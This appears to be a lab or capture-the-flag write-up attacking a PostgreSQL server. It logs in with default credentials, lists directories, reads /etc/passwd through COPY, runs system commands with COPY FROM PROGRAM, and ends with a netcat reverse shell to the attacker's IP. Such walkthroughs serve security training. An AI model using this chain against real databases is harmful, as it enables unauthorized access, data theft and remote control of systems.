# 3 :5437 postgresql

```
# trying default creds
postgres:postgres

$ psql -h 192.168.122.47 -p 5437 -U postgres
Password for user postgres: postgres
psql (13.3 (Debian 13.3-1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# SELECT version();
                                                    version
----------------------------------------------------------------------------------------------------------------
 PostgreSQL 11.7 (Debian 11.7-0+deb10u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit
(1 row)

# Found exploit that works on v9.3 - latest
Using https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5

# explore dir-structure
postgres=# SELECT pg_ls_dir('./');

postgres=# SELECT pg_ls_dir('/home');
 pg_ls_dir
-----------
 wilson
(1 row)

postgres=# SELECT pg_ls_dir('/home/wilson');
   pg_ls_dir
---------------
 .bash_logout
 .gnupg
 .bash_history
 .profile
 local.txt
 .bashrc
 ftp
(7 rows)

# to read files
# SELECT pg_read_file('<file>');
[OR] we need to create a table 
# CREATE TABLE <t-name> (out TEXT);
# COPY <t-name> FROM '<file-path>';
# data is appended on multiple COPY
# SELECT * FROM <t-name>;
# TRUNCATE <t-name> to empty the contents


# Reading /etc/passwd
postgres=# CREATE TABLE kashz (out TEXT);
CREATE TABLE
postgres=# COPY kashz from '/etc/passwd';
COPY 29
postgres=# SELECT * from kashz;
out
-------------------------------------------------------
root:x:0:0:root:/root:/bin/bash
[truncated]
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
wilson:x:1000:1000:wilson,,,:/home/wilson:/bin/bash
(29 rows)

# run system command
COPY <t-name> FROM PROGRAM '<cmd>';

postgres=# COPY kashz FROM PROGRAM 'whoami;id;hostname;uname -a';
COPY 4
postgres=# SELECT * from kashz;
out
------------------------------------------------------------------------------------
postgres
uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
nibbles
Linux nibbles 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux
(4 rows)

postgres=# COPY kashz from PROGRAM '/usr/bin/nc -e /bin/bash 192.168.49.122 80';

$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.122] from (UNKNOWN) [192.168.122.47] 57814
whoami;id
postgres
uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
```
